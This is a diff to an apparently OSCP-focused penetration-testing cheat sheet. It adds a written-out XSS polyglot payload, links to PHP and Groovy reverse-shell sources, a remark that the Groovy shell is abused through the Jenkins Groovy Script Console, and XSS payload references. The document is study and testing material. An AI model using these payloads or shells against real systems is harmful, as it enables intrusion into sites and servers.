@@ -44,6 +44,8 @@ This repository describes cheat sheet and knowledge for OSCP.
 - [SQL Injection](#sql-injection)
   - [PayloadsAllTheThings](#payloadsallthethings-1)
     - [Insert Statement injection using ON DUPLICATE KEY UPDATE](#insert-statement-injection-using-on-duplicate-key-update)
+- [XSS](#xss)
+  - [Polyglot](#polyglot)
 - [Aggregating Sensitive Information](#aggregating-sensitive-information)
   - [truffleHog](#trufflehog)
     - [Scan GitHub](#scan-github)
@@ -82,6 +84,9 @@ This repository describes cheat sheet and knowledge for OSCP.
   - [References for OSCP](#references-for-oscp)
     - [GTFOBins](#gtfobins)
     - [Reverse shell cheat sheet](#reverse-shell-cheat-sheet)
+      - [php-reverse-shell](#php-reverse-shell)
+      - [Groovy Reverse shell](#groovy-reverse-shell)
+    - [HTML Security CheatSheet](#html-security-cheatsheet)
   - [References for vulnerabilities](#references-for-vulnerabilities)
     - [Shellshock (CVE-2014-6271)](#shellshock-cve-2014-6271)
 - [LICENSE](#license)
@@ -212,6 +217,14 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
 ### Insert Statement injection using ON DUPLICATE KEY UPDATE
 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#insert-statement---on-duplicate-key-update
 
+# XSS
+## Polyglot
+The following script includes multiple payloads to improve the test efficiency.
+```shell
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+```
+https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot
+
 # Aggregating Sensitive Information
 ## truffleHog
 This tool gets high entropy strings (e.g. Password, APIKey, etc...).
@@ -340,6 +353,18 @@ https://gtfobins.github.io/
 
 ### Reverse shell cheat sheet
 https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+#### php-reverse-shell
+https://github.com/pentestmonkey/php-reverse-shell
+
+#### Groovy Reverse shell
+https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76
+
+NOTE: This shell is abused in Jenkis Groovy Script Console.
+https://blog.pentesteracademy.com/abusing-jenkins-groovy-script-console-to-get-shell-98b951fa64a6
+
+### HTML Security CheatSheet
+https://html5sec.org/
+This cheat sheet shows the XSS payloads against each browser.
 
 ## References for vulnerabilities
 ### Shellshock (CVE-2014-6271)
